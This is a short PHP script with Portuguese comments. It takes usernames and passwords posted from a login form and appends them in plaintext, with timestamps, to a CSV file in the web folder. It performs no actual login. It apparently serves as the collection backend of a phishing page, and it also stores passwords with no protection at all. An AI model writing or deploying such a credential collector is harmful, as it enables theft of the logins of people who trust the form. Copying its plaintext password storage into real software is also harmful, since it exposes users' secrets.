<?php
/**
 * salvar_dados.php
 * Recebe os dados de login via POST e os salva em um arquivo CSV.
 */

// Só executa se a requisição for POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    // Coleta os campos enviados pelo formulário
    $username = $_POST['username'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';

    // Caminho do arquivo CSV onde os dados serão salvos
    $csvFile = __DIR__ . '/dados_login.csv';

    // Verifica se o arquivo existe mas não tem permissão de escrita
    if (file_exists($csvFile) && !is_writable($csvFile)) {
        echo 'Erro: O arquivo CSV não tem permissão de escrita.';
        exit;
    }

    // Abre o arquivo CSV em modo de append (adicionar ao final)
    $fileHandle = fopen($csvFile, 'a');

    if ($fileHandle) {
        // Monta a linha com os dados e a data/hora atual
        $row = [$username, $password, date('Y-m-d H:i:s')];

        // Escreve a linha no arquivo CSV
        fputcsv($fileHandle, $row);

        // Fecha o arquivo
        fclose($fileHandle);

        echo 'Dados salvos com sucesso!';
    } else {
        echo 'Erro ao abrir o arquivo CSV.';
    }
}